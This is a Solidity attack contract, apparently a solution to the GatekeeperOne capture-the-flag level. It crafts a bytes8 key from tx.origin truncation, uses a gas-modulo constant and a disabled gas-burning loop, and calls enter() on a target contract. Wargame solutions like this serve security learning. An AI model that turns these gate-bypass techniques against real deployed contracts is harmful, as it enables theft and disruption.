/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOneInterface {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

  uint32 public gate3_1_1;
  uint16 public gate3_1_2;
  uint32 public gate3_2_1;
  uint64 public gate3_2_2;
  uint32 public gate3_3_1;
  uint32 public gate3_3_2;
  bool public gate3_bool_1;
  bool public gate3_bool_2;
  bool public gate3_bool_3;
  bytes8 public _gateKey;
  uint public gasmodulo = 8191+17326+21000;
  uint256 public gas1;

  function resetContract() public {
    gate3_1_1 = 0;
    gate3_1_2 = 0;
    gate3_2_1 = 0;
    gate3_2_2 = 0;
    gate3_3_1 = 0;
    gate3_3_2 = 0;
    gate3_bool_1 = false;
    gate3_bool_2 = false;
    gate3_bool_3 = false;
  }

  //Not Using Burn, just manual calculation
  function burn() internal {
    while ((gasleft()-5951) % gasmodulo != 0) {}
  }

  function GatekeeperOneStaging(bytes8 _gateKey) public {
      gate3_1_1 = uint32(uint64(_gateKey));
      gate3_1_2 = uint16(uint64(_gateKey));
      gate3_2_1 = uint32(uint64(_gateKey));
      gate3_2_2 = uint64(_gateKey);
      gate3_3_1 = uint32(uint64(_gateKey));
      gate3_3_2 = uint16(uint160(tx.origin));

      gate3_bool_1 = uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) ? true : false;
      gate3_bool_2 = uint32(uint64(_gateKey)) != uint64(_gateKey) ? true : false;
      gate3_bool_3 = uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) ? true : false;
  }

  function AttackGatekeeperOneStaging(address addr, bytes8 _gateKey) public {
      address OTHER_CONTRACT = addr;
      _gateKey = _gateKey;
      GatekeeperOneInterface GatekeeperOneContract = GatekeeperOneInterface(OTHER_CONTRACT);
      //burn();
      gas1 = gasleft();
      GatekeeperOneContract.enter(_gateKey);
  }

  //Do not use this, use AttackGatekeeperOneStaging()
  function AttackGatekeeperOne(address addr, bytes8 _gateKey) public {
      address OTHER_CONTRACT = addr;
      _gateKey = _gateKey;
      GatekeeperOneInterface GatekeeperOneContract = GatekeeperOneInterface(OTHER_CONTRACT);
      GatekeeperOneContract.enter(_gateKey);
  }
}